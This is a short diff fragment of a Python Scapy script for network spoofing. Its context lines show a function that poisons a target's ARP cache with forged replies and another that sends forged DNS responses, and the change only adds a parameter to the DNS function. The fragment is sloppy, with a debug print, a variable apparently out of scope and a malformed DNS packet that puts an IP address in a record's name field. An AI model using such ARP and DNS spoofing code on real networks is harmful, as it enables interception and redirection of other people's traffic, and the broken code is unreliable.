@@ -11,7 +11,7 @@ def spoofarpcache(targetip, targetmac, sourceip):
     send(ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac), verbose=False)
     print("yo")
 
-def sendFakeDNS():
+def sendFakeDNS(tpr):
     dnsResPacket = IP(dst=targetip)/UDP(dport=53)/DNS(rd=1, qr=1, qd=DNSRR(qname="61.13.148.37"))
     send(dnsResPacket)
 
